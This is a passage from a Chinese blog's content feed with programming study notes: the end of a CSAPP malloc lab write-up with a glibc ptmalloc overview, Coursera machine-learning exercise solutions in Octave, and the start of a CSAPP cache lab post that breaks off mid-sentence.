PUT(LAST_PTR(ptr), NULL); add_node(ptr, getSizeClass(res_size)); PUT(HDRP(new_block), PACK(size, 0x3)); ptr = new_block; OR(HDRP(NEXT_BLKP(ptr)), 0x2); &#125; return ptr;&#125; realloc 关于这个函数，是因为它有比较多的可以优化的地方。trace文件中的最后两个测试如果不采用一定的优化的话，会导致空间利用率很低，甚至Out of memory。 首先，如果realloc的size比之前还小，那么我们不需要进行拷贝，直接返回即可(或者可以考虑对当前块进行分割) 其次，如果下一块是一个空闲块的话，我们可以直接将其占用。这样的话可以很大程度上减少external fragmentation。充分地利用了空闲的块。(前一个块是空闲的话并没有什么作用。还是需要将内容复制过去，因此不讨论) 接着，如果下一个块恰好是堆顶，我们可以考虑直接拓展堆，这样的话就可以避免free和malloc，提高效率。 最后，实在没有办法的情况下，我们再考虑重新malloc一块内存，并且free掉原先的内存块。这里要注意一下malloc和free的顺序，如果直接换过来的话可能导致错误。(free的时候有可能会把predecessor和successor的位置清为NULL，这里具体要看前面的函数是怎么写的。总之要小心一点。)12345678910111213141516171819202122232425262728293031323334353637383940414243void *mm_realloc(void *ptr, size_t size)&#123; if (size == 0) &#123; mm_free(ptr); return NULL; &#125; if (ptr == NULL) return mm_malloc(size); size_t oldBlockSize = GET_SIZE(HDRP(ptr)); size_t oldSize = oldBlockSize - WSIZE; if (oldSize &gt;= size) &#123; // 这里有另一种策略，如果realloc分配的内存过小，我们可以考虑对这个块进行分割，一定程度上提高了内存的利用率 return ptr; &#125; else &#123; size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr))); size_t next_size = GET_SIZE(HDRP(NEXT_BLKP(ptr))); // 下一块内存是空闲的，并且和当前块大小加起来足够用，则占用下一块内存 if (!next_alloc &amp;&amp; next_size + oldSize &gt;= size) &#123; delete_node(ptr + oldBlockSize, getSizeClass(next_size)); OR(HDRP(NEXT_BLKP(NEXT_BLKP(ptr))), 0x2); PUT(HDRP(ptr), PACK(next_size + oldBlockSize, GET_PREV_ALLOC(HDRP(ptr)) | 0x1)); return ptr; &#125; // 下一块内存刚好是堆的顶部，直接拓展即可。可以不用free后再malloc。 if (NEXT_BLKP(ptr) == start_pos) &#123; size_t newsize = ALIGN(size - oldSize); if (mem_sbrk(newsize) == (void*)-1) return NULL; PUT(HDRP(ptr), PACK(oldBlockSize + newsize, GET_PREV_ALLOC(HDRP(ptr)) | 0x1)); start_pos += newsize; PUT(HDRP(start_pos), PACK(0, 0x3)); return ptr; &#125; void *newptr = mm_malloc(size); if (newptr == NULL) return NULL; memcpy(newptr, ptr, oldSize); mm_free(ptr); return newptr; &#125;&#125; something else 这个实验如果要拿到满分的话，可能还是得针对具体的数据设置恰当的自定义数据结构来完成。这里笔者实在无能为力了，只能简单提一下几种常见的思路吧。 首先还是说一下按照上述方法写，如果不出意外的话，应该是有95分以上的，但是我们会发现，这种写法存在这一些弊端。首先是一些讨论明显是针对测试数据而设计的，如果测试数据更改，那么整个程序的效率就会大打折扣。其次，我们采用将各个块根据大小分组的话会出现一些问题。比如random-bal文件中，alloc的数据大多数都很大(大于4096)，或者实际应用中，多次申请相同大小的内存，它们将被放在同一个链表当中。如果分配后迟迟没有free的话，会导致链表越来越长，从而使得效率越来越低。这里有一种优化方式就是采用BST来进行维护。我们将所有大小相同的块组织成一个链表，BST中的每一个节点即为链表的表头，当某一个大小的块全部用完的时候，则将其从BST中删除，这样，插入和查找，搜索的效率均为O(log2n)。 具体的每个free块结构如下1234567891011121314151617struct block &#123; // 头部块 unsigned size_head:29; unsigned flag_head:3; // 链表的下一个节点和上一个节点 block* pred; block* succ; // 树的左儿子，右儿子和父亲 block* left; block* right; block* father; payload... // 尾部块 unsigned size_foot:29; unsigned size_foot:3;&#125; 当然，采用BST的话，理论上我们运行的速度会快很多，然而，这还是有问题。BST并不能保证效率为O(log2n)，当某些情况下，比如每一次分配的大小都恰好比上次多一点点，这样的话就会导致效率急剧下降，整个BST退化成了链表。为了解决这个办法，可以采用平衡树，这使得整体的各种操作的效率会更加趋近于O(log2n)。 至于空间效率方面的话，若要拿到满分，除了根据数据再进行一些特定的判断以外，笔者暂时想不到更好的办法了。如果你有一些更好的办法，请务必告诉我。 最后，如果有需要的话，欢迎到我的github上查看详细文件。 关于ptmalloc 既然我们前面已经讲述了如何自己手动模拟一个allocator，那么我们不妨来简单地看看真正的malloc函数究竟是怎么样的吧！ 参考资料: https://blog.csdn.net/z_ryan/article/details/79950737 chunk malloc中chunk的定义和我们的malloc lab颇为相似。具体定义在malloc.c文件中。其中，最后的两个next_size指针用于比较大的块中，当同一个大小的块较多时，线性遍历比较浪费时间，因此用next_size，指向下一个大小的块。 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 同样的，共有两种不同类型的chunk，第一种是已被占用的chunk，另一种是空闲的chunk，在malloc.c中，结构如下：12345678910111213141516171819202122232425262728293031323334// allocated chunkchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+// free chunkchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|0|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 其中，由于我们的块使用的是8字节对齐，因此，块的大小的最后3位一定是0。因此，我们同样可以把这三位利用起来。其中，最后一位P表示上一个块是否被占用，倒数第二位M表示该块是否来自于mmap函数，倒数第三位A表示当前块是否位于非主分配区。 分配区 在malloc中，共有两种分配区。第一种是MAIN_ARENA，即主分配区，初始时进行内存分配均在主分配区中。第二种是NON_MAIN_ARENA，即非主分配区。初始时仅有主分配区。分配区具体和线程相关，当某个线程想要使用malloc获取一段内存时，在有采用多线程的情况下，会先使用arena_get获得当前线程所在的分配区，并且，为该分配区加上互斥锁。该宏定义如下： 1234567891011#define arena_get(ptr, size) do &#123; \ ptr = thread_arena; \ arena_lock (ptr, size); \ &#125; while (0)#define arena_lock(ptr, size) do &#123; \ if (ptr) \ __libc_lock_lock (ptr-&gt;mutex); \ else \ ptr = arena_get2 ((size), NULL); \ &#125; while (0) 倘若从该分配区上没有分配到所需的内存时，尝试从其他分配区中获取内存。如果找不到一个未加锁的分配区，则使用mmap增加一个非主分配区，并在该分配区上分配内存。 bins 在malloc中，由于块之间是用链表串起来的，每一条链表我们称之为bin。其中，每个bin中的大小比较接近，并且bin中的块按照大小排序，当大小相同时，则按照使用是否最近刚使用过排序，类似于LRU。在malloc中，总共有128个bin，按照大小等因素分类，总共有以下四种bin: Fast bin Unsorted bin Small bin Large bin 各个相邻bin间的大小间隔如下： 64 bins of size 8 32 bins of size 64 16 bins of size 512 8 bins of size 4096 4 bins of size 32768 2 bins of size 262144 1 bin of size what’s left Fast bin fast bin中存放的是大小小于64B的chunk，用于处理程序在运行过程中申请的较小的内存空间。通常情况下，fast bin中即使两个块相邻也不会主动合并(合并后如果malloc又申请了一些较小的内存，那么需要再次进行分割，耗费时间)。各个bin存放的块的大小以8B递增，同时，每一个bin中块的大小相同，分配时直接从头部摘除，同理，free的时候直接连接在了头部，加快了分配的效率。 在分配时，malloc优先从fast bin中寻找大小恰当的块。 Unsorted bin unsorted bin是bins的缓冲区，如同其名字所示，其中存放的bin的大小任意，并且也不需要按照大小顺序排序，当在small bin中找不到合适大小的块的时候，会在该bin中查找。当用户释放内存，或者fast bin合并后，或者发生了分割后剩下的块，会优先进入该bin。并且，查找后，把unsorted bin中的块放进对应的small bin或者large bin中。 Small bin small bin中存放的是大小大于64B，小于512B的块，每个bin内的块大小相同，相邻的块之间大小相差8B。链表具体的各种操作和fast bin类似，不过两个相邻的块之间会发生合并，以减少碎片的产生。 Large bin large bin中存放的是大小大于512B的块，其中，每个bin内块的大小不一，按照大小递减排序，大小相同则按照近期是否使用排序。分配时，完全遵循best fit，即满足大小要求的最小的块。分配后，会进行切割，剩下的块加入unsorted bin当中。 else 除了上面几种bin，还有一些比较特殊的块，不包含在任何一个bin当中。 大小超过128kb的块，将直接使用mmap函数。并且，所有M标记位为1的块，其他的标记位将被忽略，同时，这些块也不会进入到bin当中，当使用free函数时，这些块将直接通过unmmap还给操作系统 top chunk。这是一个特殊的块，位于堆的顶部。当所有的bin中的块的大小都不满足要求时，将会使用这个chunk。(注意，这依然满足best fit，top chunk被视为无限大)。如果top chunk的大小仍然不够，则会根据所需的大小使用mmap或者sbrk来拓展。 malloc &amp; free 当我们调用malloc函数时，首先调用的是__libc_malloc函数，该函数做一些判断处理的工作，最后，malloc的具体实现逻辑交由__int_malloc函数执行。具体步骤如下： 若是多线程，需要获取分配区的指针并上锁。否则跳过 计算所需的块的实际大小 如果所需的块大小小于fast bin的阈值，尝试从fast bin中获取。若获取失败，进入下一步。 若所需的块的大小位于small bin中，尝试从small bin中获取，若获取失败，进入第6步。若块的大小不位于small bin中，进入下一步。 调用malloc_consolidate函数，对fast bin进行拆除和合并，并扔进unsorted bin中。 进入循环，尝试从unsorted bin中获取，能获取到大于所需大小的，则进行切割并返回。同时，unsorted bin中大小位于small bin和large bin的块分别扔对应的bin中。 从large bin中按best fit查找，如果找到，则切割并返回。 从top chunk中获取，若top chunk 满足要求，则进行切割。若不满足要求，则扩容 总之，对于某一个特定的请求，执行的顺序大致为： fast bin -&gt; small bin -&gt; unsorted bin -&gt; large bin -&gt; top chunk -&gt; extend_heap 当我们调用free函数时，整体的过程也是类似的。 首先，进行一些特殊判断后。如果该块属于mmap映射得到(M标志位)，直接unmmap还给操作系统。否则，进入下一步。 获取分配区的指针。大小如果小于fast bin的阈值，直接放入其中。如果下一个chunk也是空闲，则触发合并操作，并扔入unsorted bin中。大小如果大于该阈值，则放入unsorted bin中，并且检查是否需要合并。 倘若当前块与top chunk相邻，则与top chunk合并。并且，对于主分配区，top chunk如果大于收缩阈值(128KB)，则归还一部分给操作系统。 summary 这个实验难度真的比较大。很多东西都没有提供，要靠自己写。并且，对于这个实验来说，非常容易出现segment fault，并且调试难度很大。像笔者花在调试上面的时间真的很多，常常因为漏打了标记之类的出错，然后就一直检查不出来了，很花时间。当然，这个时间我觉得的话还是很值得的，起码锻炼了自己调试的能力。建议如果要做这个实验的话，可以试着每过一段时间就保存一下，尤其是正确通过测试的时候，把文件复制到别的地方，然后再继续做一些优化，这样出了问题我们还可以比较一下。 转眼之间这个已经是倒数第二个实验了，寒假也已经到了尾声。这个时候还是希望自己不要太焦躁，开学了，心态也要放好一点，这样才能更好地进步。]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>memory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-learning-ex2]]></title>
    <url>%2F2019%2F02%2F09%2FMachine-learning-ex2%2F</url>
    <content type="text"><![CDATA[序 这个系列是关于coursera上吴恩达的machine learning课程的文章。主要内容将包括每个week的编程练习作业，也可能会有一些笔记，知识的整理等，记录下自己学习这个课程的一些心得和体会。本文的主要内容是week 3的编程练习。 关于任务提交，octave的安装中的一些小问题，在上一篇文章中已经有所提及，这里不再赘述。 任务正文 其实上一期任务如果能顺利做下来的话，这一周的任务应该算是很简单的了。基本上照着教程走就没有任何问题了，这里可能着重提一下一些其他的点吧。 需要填写的文件有： sigmoid.m 对每个元素求g(x) = 1 / (1 + e^(-x))plotData.m 将数据可视化costFunction.m 计算代价函数以及梯度predict.m 对给定的theta和X，计算预测值(0 或 1)costFunctionReg.m 计算正则化的代价函数以及梯度 plotData.m 这个函数同样的，我们只要照着pdf打即可。注意其中find函数的用法，可以直接获得向量y中所有y=1或y=0的位置 pos = find(y==1);neg = find(y==0);plot(X(pos, 1), X(pos, 2), ‘k+’, ‘LineWidth’, 2, ‘MarkerSize’, 7);plot(X(neg, 1), X(neg, 2), ‘ko’, ‘MarkerFaceColor’, ‘y’, ‘MarkerSize’, 7); sidmoid.m 按照公式打即可。 g = 1 ./ (1 + exp(-z)); 注意’./‘符号作用是用1去除以向量z中的所有元素，得到另一个和z维度相同的向量。exp(x)用于求ex。 另，关于这个g(x)函数，也就是logistic regression和linear regression的一个重要区别。因为在logistic regression，用h(x)表示预测值的话，h(x)的范围应该在(0, 1)当中，且应该是关于y轴上某一点对称。然后我们发现，g(x) = 1 / (1 + e-x)满足了我们所有的需求。当然，这里笔者有个问题，既然我们能采用这个函数来对数据进行转换，我们是不是也可以找到另一个同样满足要求的函数替换掉g(x)呢？ costFunction 在logistic regression中我们用h(x)=g(θTX)代替了h(x)=θTX。并且，我们不再采用平方差的形式，而是使用了log的形式，并且，对于y==0或者y==1的情况的计算公式应该是有区别的，因此，最后采用了这样的计算方法 为了更便于我们的计算，我们将这两个公式合并在一起，就变成了下面的公式。当y==0或y==1时，这个公式分别变成了上面的两个公式。 然后，就是关于梯度的计算。和之前的做法其实是一样的。如果不能理解的话还是建议画图。 具体计算方法如下： z = X * theta;h = sigmoid(z);J = -(y’ * log(h) + (1 - y’) * log(1 - h))/ mgrad = X’ * (h - y) / m; prediction 对于给定的theta和X，我们可以求得当前theta和数据集的情况下θTX的值，我们知道当x大于等于0.5的时候，我们得到的预测值为1，否则预测值为0。由此可以得到以下的写法： p = sigmoid(X * theta);p(find(p &gt;= 0.5)) = 1;p(find(p &lt; 0.5)) = 0; costFunctionReg 对于正则化下的代价函数，难度稍微增大了一些。 首先是J的计算。和之前相比，现在的代价函数多了一个平方项，由于这一个项的存在，当足够多次的迭代过后，theta总会趋向与0，这就使得在预测函数中，某些项的系数会很快地趋近于0，这样就相当与去掉该项，从而避免了过拟合(overfit)的发生。当然，lambda的值必须取好一点。若取值过大，则会导致前面的log项的作用被稀释，甚至被忽略。最后导致求得的结果连我们给定的数据集都没办法拟合。若取值过小，起不到相应的作用，函数千方百计地拟合我们给定的数据集，使得曲线十分奇怪，过拟合依旧会发生。 接着，是梯度值的计算。为了向量化计算，这里引入了mtheta变量，其中除了第一个位置以外和theta完全相同，即θ0=0。这样的话，在计算的时候就不会造成影响。注意到正则化是不会对去涉及θ0=0的，笔者一开始在这里没注意，导致预测值出现了问题。 mtheta = theta;mtheta(1) = 0; z = X * theta;h = sigmoid(z);J = -(y’ * log(h) + (1 - y’) * log(1 - h))/ m + mtheta’ * mtheta * lambda / (2 * m); grad = X’ * (h - y) / m + mtheta * lambda / m; 总结 整体上来说，这个练习确实是偏简单了一些，更多的可能是想让我们稍微了解一下该如何去实现某一个特定的算法而已。当然，这个练习中还没有涉及multiple-class的情况，如果有的话，难度应该会更上一层了。接下来下一个周貌似就有相关的练习了，并且将要涉及到Neural Networks的一些东西了。加油吧。]]></content>
      <categories>
        <category>machine learning</category>
      </categories>
      <tags>
        <tag>machine learning</tag>
        <tag>coursera</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-learning-ex1]]></title>
    <url>%2F2019%2F02%2F03%2FMachine-learning-ex1%2F</url>
    <content type="text"><![CDATA[序 这个系列是关于coursera上吴恩达的machine learning课程的文章。主要内容将包括每个week的编程练习作业，也可能会有一些笔记，知识的整理等，记录下自己学习这个课程的一些心得和体会。本文的主要内容是week 2的编程练习。 为什么要写这个系列？ 恩，可能只是一时冲动而已吧。首先，通过前面写的关于csapp系列文章，笔者觉得还是应该养成一个写博客的习惯吧。虽说写博客花的时间真的挺多的(前面的那几篇文章基本上至少半天，多的话要写一天甚至更多)，但很明显还是能感觉得到写完博客之后对于知识的理解还是更加清楚了一些，基本上重新看一遍能够回想起当时做的时候的思路历程。并且尽管这个教程算是很有名了，但是网上的一些资料质量还是参差不齐，不少都有着各种各样的问题。因此，笔者决定自己来写这个系列，一是为了加深理解，便于日后重新回顾，二是希望能够给恰好点开了这篇文章的同学一点点帮助。当然，由于笔者目前水平有限，且笔者也是第一次接触机器学习，难免会出现各种各样小问题，如果你发现了一些问题，也欢迎与我联系(点击右下角的小图标即可，可能要稍微等一会)。 Octave 的安装问题 笔者的系统为 archlinux: 4.20.0 在安装过程中，出现了一些找不到共享库的情况，类似于这样的错误： error while loading shared libraries: libxxx.so 遇到这种错误的时候，其实安装对应的库就行了，比如libreadline.so的库名称为readline。直接用对应的系统的下载命令即可。(笔者用的是 yay xxx命令)。不过，安装的时候记得看清楚提示，笔者就是因为没注意提示然后导致libreadline.so库丢了，然后开机都没办法，最后还是用U盘上的系统把这个库拷贝过来才解决的。 任务正文实验如何提交 首先，在octave下，进入ex1文件夹中(octave可以使用linux系统的ls, cd命令)，然后直接输入submit即可，顺利的话很快就可以看到结果。做完所有任务的话看到的信息应该是这样: 不过，笔者在octave中，submit后就直接卡住了，应该是网络的问题，被墙了。笔者采用的解决办法是使用proxychains代理运行octave，然后submit就成功了。不同系统的话解决办法不一定相同，但总之注意好代理应该就可以了。下载的时候也是，笔者是采用proxychains + curl命令直接下载文件的。 one feature 这个实验我们必须完成的函数仅为一个特征的情况，难度较小。one feature下我们需要填写的文件有： warmUpExercise.m 用于练习submitplotData.m 用于data的可视化computeCost.m 计算代价函数J(theta)gradientDescent.m 实现梯度下降算法 主要是为了测试一下submit能否正常运行。其中，第一个文件答案仅一行(注意不要漏了分号)。1A = eye(5); 第二个文件答案只要照着pdf打即可。123plot(x, y, 'rx', 'MarkerSize', 10);ylabel('Profit in $10,100s');xlabel('Population of City in 10,000s'); 注意，其中plot的用法(可以输入help plot查看)。’r’表示红色，同理可以换成’b’,’g’等。’x’表示用X来展示每个数据，同理可以换成’o’，表示用圆圈来展示等。最后’markerSize’表示每个标记的大小为10，可以修改这个数字自己看一下效果，也可以输入’LineWidth’，’color’等，具体效果可以自行尝试。 代价函数的计算 这里代价函数计算单特征和多特征的写法是一样的，因此放在一起写。请务必保证每一步都可以理解清楚，建议画图加深理解。 首先，我们观察hθ(x)的计算公式： 用X表示我们的m * (n+1)的数据集，其中，m表示example数量，n表示特征数量，则X是一个m * (n+1)的矩阵。 用theta表示我们当前的变量theta，时刻记住，theta是一个n维的向量(m * 1)，n与特征数相对应。因此，用向量化的思想，h(x)即可以表示为X * theta，注意矩阵乘法是不可交换的。相乘之后我们得到一个m维的向量，即m个example各自对应的预测值，再减去实际值y(y同样是一个m维的向量)，即得到我们误差向量c。 而最后我们要的应该是每一个误差的平方再除以2m，可以用c’和c相乘即可。 最后的答案为(c’ * c 也可以写成 sum (c .* c)，没有区别)。 c = X * theta - y;J = c’ * c / (2 * m); 梯度下降算法的实现 梯度下降算法多特征理解起来可能还是有一点难，强烈建议画图，并且通过图好好理解。 首先，还是先来看一下公式。对第j个theta，我们要进行如下的更新，而且所有的theta应该同时更新。注意，具体计算的时候，我们把theta看成是一个n + 1维的向量。 即我们可以看成： 这个时候别忘了，在上面的公式中，我们的变量是theta，也就是说，i可以理解成是一个常数。右边的x(i)应该也是和theta对应的一个m维的向量，而X即我们的数据集。而i是常数，因此，hθ(x(i)) - y(i)也是一个常数。hθ(x)-y应该是一个m维的向量。 用c表示该向量，则X’ * c 即可以表示上面的公式中sigma右边试子的值。 因此，最后的答案为: c = X * theta - y;theta = theta - X’ * c * alpha / m; 两个文件写完之后，我们可以运行ex1，查看我们的结果和预期的结果是否相同，最后成功的话应该可以看到一条直线基本上能拟合我们的数据，说明应该是成功了。这个时候我们就可以submit上去了。 multiple features 这个练习后面又有一个选择性的练习，即多特征下的梯度下降，整体思路其实很相似。 对于多个特征的数据，很多情况下，我们需要先将其标准化，以减少迭代次数。这里，我们使用mean和std函数帮助我们的计算。 mu = mean(X);sigma = std(X);X_norm = (X - mu) ./ sigma; 其中，X为我们的数据集，而X中的每一列即表示我们某一个特征的所有数据。mean(X)求出矩阵X每一列的平均值，存储在向量mu中。std(X)求出每一列的标准差，存储在向量sigma中。最后对X中的每一列，每一行的数字减去该列的平均值，再除以方差即完成标准化的步骤。 然后，我们需要完成computeCostMulti.m 和 gradientDescentMulti.m 文件，实现多特征的梯度下降算法，具体写法上面已经有写，这里不再赘述。倘若没有问题，输入ex1_multi后，我们应该可以看到以下的输出： 然后，我们需要修改ex1_multi中的值，有h(x)的计算公式，我们很容易得到price应该是： price = [1,1650,3] theta; 好了，这个时候我们倘若运行，会发现预测得到的price极其大，而我们通过看几个数据，发现price应该是在30w上下的，是我们梯度下降做错了吗？其实并不是，这里有一个坑。我们前面用到了特征的归一化，而对于我们要预测的值，我们并没有进行处理，这个时候得到的答案显然就是错误的。正确的答案应该是： price = [1,([1650,3] - mu) ./ sigma] * theta; 注意，计算mu和sigma的时候我们还没有的x0还没有加上去。因此预测值向量应该是[1,([1650,3]-mu) ./ sigma]。最后得到的答案是29w多一点。 接着，文档中又给出了一个选择alpha的测试，有兴趣的话可以改一下ex1_multi中的alpha变量，看一下收敛需要的迭代次数的变化。 最后，是一个标准方程的测试，我们将公式直接输入进去即可。具体原理暂时不懂，等学完线性代数再去理解吧。 theta = pinv(X’ * X) * X’ * y; 最后 到这里，整个实验的所有题目就结束了，然而这样真的就全部完了吗？笔者还发现了一个小细节，不知道是不是作者故意留下来的。如果你写法和我一样的话，你可能也会看到这样的输出： 我们发现，梯度下降得到的答案和标准方程得到的答案有一定的差异。这个应该就算是误差了，当迭代次数越来越多的时候，梯度下降得到的值应该会越来越可靠。从预测值中我们看到，虽然有误差，但其实还可以接受。然而，我们看一下两种方法得到的theta，差别却非常大。这说明了我们用梯度下降算法得到的应该是某一个局部最优解，而这个局部最优解和全局最优解差别很小。]]></content>
      <categories>
        <category>machine learning</category>
      </categories>
      <tags>
        <tag>machine learning</tag>
        <tag>coursera</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Cachelab]]></title>
    <url>%2F2019%2F01%2F29%2Fcsapp-Cachelab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第六篇文章。具体题目请见官网。本文主要讲csapp中的cache lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。 建议在开始实验以前，先把官方的资料看下。如果有时间的话，也可以看一下web aside里面blocking相关的一些知识，对于理解题目思路有一定帮助。 cache lab 这个实验总共只有两个部分，part A 要求我们写一个cache simulator, 总体来说比较简单，注意好各个指令间的区别就可以了。part B 是要求我们在特定的条件下对矩阵转置进行适当的优化，有一定难度。 主要实验文件traces 文件夹 存放用于part A测试的一些文件csim.c 完成part A 需要填写的文件trans.c 完成part B 需要填写的文件test-csim 和 test-trans 分别用于对part A 和 part B的测试driver.py 用于对part A 和 part B 整体进行测试 实验目的：part A 主要加深了我们对于缓存的理解，要求能够理解最简单的缓存在机器中是怎样实现的，能够解决写入缓存，读取缓存的一些问题。part B 主要通过优化转置这个任务，加深我们对cache miss的理解，懂得如何尽量减少cache miss 的产生，以提高程序效率。 实验正文part A part A 总体没有什么比较好讲的地方。最主要就是确定好数据结构，理解清楚L S M三个指令之间的区别就可以了。不过笔者在这道题上面却卡了特别久，原因在于对于这几个指令的理解不够深，然后没怎么思考就直接写，导致出了一些问题，找bug花了很长时间，最后发现从一开始的思路就错了，于是才推倒重来。 首先，我们需要用到getopt函数来解析命令行参数。这个函数的用法网上有很多，直接搜索就可以找到很多有用的资料，这里不赘述了。 然后，我们来看一下对于四个指令，I指令我们不需要管，可以直接忽略。剩下L S M三个。一个合格的cache应该做到： 对于load指令，从内存中读取，首先我们需要判断要读取的地址是否有放在缓存当中，有的话就是cache hits，直接返回。没有的话就是cache misses，这个时候需要从内存中读取，然后我们还要将这个地址及其对应的值放入缓存当中。 对于store指令，往内存中写入，首先我们还是需要判断要存储的目标地址是否放在缓存当中。如果有的话，由于我们采用的是write back策略，我们只需要将值存储在cache当中，只有当其要被替换时，我们才将其写入到内存当中。如果没有的话，发生cache misses这个时候我们需要从内存中读取，在放入缓存当中，在缓存中进行修改。 对于modify指令，其实就是先执行load指令，再执行store指令。 实验要求我们输出hits，misses, evicts的次数，并不需要保存缓存中每一个block的值，并且，题目保证了load和store的时候不会越过某一个block的边界，进一步使题目变简单。细心的你可能会发现，我们不需要对三种指令分别进行相应操作。load 和 store指令在本题中没有区别。我们可以将这两个指令分别拆分成两个部分： search 搜索对应的set块中是否存在缓存，存在的话则cache hits，更新lru后直接返回，否则发生cache misses，进行第二步 insert 首先判断当前set块中是否还存在空的line，存在的话我们将其填上，然后返回。不存在的话发生cache evicts，这个时候，由于我们不需要管各个地址中的值，只需要更新一下lru和tag即可。 对于modify，由于load如果缓存中不存在的时候，会从内存中找并且放入缓存当中，因此，store指令一定是cache hits。我们相当与只需要执行load，然后hits++即可。 附：lru(least recently use)在本题中用时间戳表示。每读取一个指令时间戳+1。因此可以保证后一个进缓存的或者后一个被访问到的lru一定更大。我们每次替换的时候只需要找lru最小的那个即可。 核心代码如下：1234567891011121314151617181920while(fscanf(fs, "%s %llx,%d", is, &amp;address, &amp;size) != EOF) &#123; if (is[0] == 'I') continue; address &gt;&gt;= blockSize; set = address % maxSet; address &gt;&gt;= setNum; tag = address; struct Line* line = sets[set].line; int m = sets[set].m; // m 表示编号为set中已经用了的行数(m &lt;= E) if (search(line, m, tag, lru) != -1) hits++; // cache hits 时search返回-1 else &#123; misses++; int pos = try_insert(line, m, tag, lru); // try insert 如果有空位，返回-1，没有空位，则返回lru最小的那个值 if (pos != -1) &#123; evicts++; evict(line, pos, tag, lru); // 将lru最小的那个line替换掉 &#125; else sets[set].m++; &#125; if (is[0] == 'M') hits++; lru++;&#125; part B 这道题总体来说还是挺难的。尤其是64 * 64的那个部分。笔者最后也想不出比较好的办法。在参考了网上的一些资料之后，最终才拿到了满分。当然32 * 32和61 * 67那块还是比较简单的。题目所给的cache的参数为s = 5, b = 5, E = 1，于是我们知道，这是一个直接映射的cache，sets总数为32。记住cache的参数对于题目的解决及其重要。 32 * 32 首先，这道题其实和之前的performance lab很像。不过我们的目的是减少cache misses的次数，而不是减少cpe，因此重心应该放在cache上。我们可以画一个表来表示出各个元素映射到的set编号。由于32byte的block恰好可以放8个int变量，而一行一共有32个，也就是说每一行占用了4个set，8行可以将所有set填满。第九行开始则有重复之前的周期。因此，我们可以采用8 * 8的分块法，尽可能地减少miss数。 当然，如果你直接这样做，你会发现，这样还是通不了，miss数为三百多，而满分是300以内。其实还有一个重要的可以用到的优化(笔者一开始也没有注意到)。 官方给的文档中有提示，我们最多只能用到12个局部变量。而目前我们仅用了4个(四个循环)。还有8个可以用，并且8个还恰好就是一个set能存放的int数，这个时候我们发现，我们可以先将A矩阵中一整个块(8个变量)取出来，放在局部变量当中，然后再逐一赋值给B矩阵中对应的位置，这样可以避免掉很多不必要的miss(A矩阵每一个块最多只会发生1次miss，而且是必要的)，避免了A矩阵和B矩阵相互争夺某一个set导致的conflict miss。于是我们就可以成功地将miss数减少到300以内。成功解决。代码如下：12345678910111213141516171819202122#define K 8int t1, t2, t3, t4, t5, t6, t7, t0;for (i = 0; i &lt; N; i+=K)for (j = 0; j &lt; M; j+=K)for(int l = i; l &lt; i+K &amp;&amp; l &lt; N; l++) &#123; t0 = A[l][j]; t1 = A[l][j+1]; t2 = A[l][j+2]; t3 = A[l][j+3]; t4 = A[l][j+4]; t5 = A[l][j+5]; t6 = A[l][j+6]; t7 = A[l][j+7]; B[j][l] = t0; B[j+1][l] = t1; B[j+2][l] = t2; B[j+3][l] = t3; B[j+4][l] = t4; B[j+5][l] = t5; B[j+6][l] = t6; B[j+7][l] = t7;&#125; 61 * 67 为什么要把这个放在这个地方呢？当然是因为这个比较简单了。61 * 